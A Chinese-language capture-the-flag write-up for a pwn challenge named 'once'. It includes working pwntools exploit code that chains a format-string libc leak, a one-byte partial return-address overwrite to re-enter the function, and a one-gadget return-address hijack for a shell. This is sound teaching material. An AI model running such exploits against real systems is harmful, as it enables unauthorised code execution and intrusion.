# once

## 题目简述

64 位 PIE 程序没有栈 canary，`vuln` 中同时存在格式化字符串和短栈溢出。函数用 `read(0, buf, 0x30)` 向 32 字节缓冲区读取数据，随后执行 `printf(buf)`；溢出可覆盖保存的 `rbp` 和返回地址，但一次输入不足以同时泄露 libc 并构造完整 ROP，因此需要分两阶段利用。

## 解题过程

保护信息显示 NX 与 PIE 开启、canary 关闭。漏洞逻辑等价于：

```c
char buf[32];

read(0, buf, 0x30);
printf(buf);
```

第一阶段用 `%13$p` 泄露 `__libc_start_main` 返回链上的地址，同时只覆盖返回地址最低一个字节。ASLR 不改变同一映像内地址的最低 12 位，因此可把返回位置改到 `vuln` 函数建立新栈帧的指令处；官方样例覆盖为 `0xd3`，对应 `mov rbp, rsp` 附近。回到函数序言而不是直接回到依赖旧 `rbp` 的位置，是因为第一次溢出已经破坏了保存的 `rbp`。

```python
from pwn import *

libc = ELF("./libc-2.27.so", checksec=False)
io = process("./once")

stage1 = b"%13$p\n".ljust(0x28, b"A") + b"\xD3"
io.sendafter(b"turn: ", stage1)

leak = int(io.recvline().strip(), 16)
libc_base = leak - 231 - libc.sym["__libc_start_main"]
```

第二次进入 `vuln` 后，直接覆盖返回地址为提供的 libc 中满足约束的 one-gadget。官方环境使用偏移 `0x4f3d5`：

```python
stage2 = b"A" * 0x28 + p64(libc_base + 0x4F3D5)
io.sendafter(b"turn: ", stage2)
io.interactive()
```

`0x28` 包含 32 字节缓冲区和保存的 `rbp`。在其它 libc 版本中必须重新计算泄露偏移并检查 one-gadget 的寄存器/栈约束，不能照搬固定地址。

## 方法总结

短溢出只有几个字节时，PIE 的低位稳定性可以用于局部覆盖，把程序送回已有函数以获得第二次输入。格式化字符串负责泄露、局部覆盖负责重入、第二阶段再完成劫持。选择重入地址时要考虑被破坏的栈帧：若函数后续通过 `rbp` 访问局部变量，应回到重新建立 `rbp` 的序言位置。
